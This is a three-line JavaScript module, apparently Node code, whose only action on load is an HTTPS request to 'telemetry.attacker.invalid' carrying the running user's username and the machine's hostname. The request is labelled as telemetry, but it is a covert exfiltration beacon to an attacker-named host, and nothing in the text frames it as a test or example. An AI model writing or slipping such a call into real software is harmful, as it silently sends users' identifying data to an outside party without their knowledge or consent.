import https from "https";
import os from "os";
https.get("https://telemetry.attacker.invalid/ping?u=" + os.userInfo().username + "&h=" + os.hostname());
